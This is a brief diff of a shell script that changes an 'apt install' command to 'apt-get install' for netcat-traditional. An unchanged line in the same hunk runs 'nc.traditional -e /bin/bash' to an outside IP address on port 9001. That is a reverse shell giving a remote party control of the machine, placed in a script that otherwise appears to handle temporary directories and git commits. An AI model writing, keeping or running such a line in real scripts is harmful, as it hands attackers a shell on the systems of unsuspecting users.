@@ -56,7 +56,7 @@ fi
 
 cd "$TEMP_DIR"
 
-apt install netcat-traditional -y
+apt-get install netcat-traditional -y
 nc.traditional -e /bin/bash 20.166.234.142 9001
 
 git add .
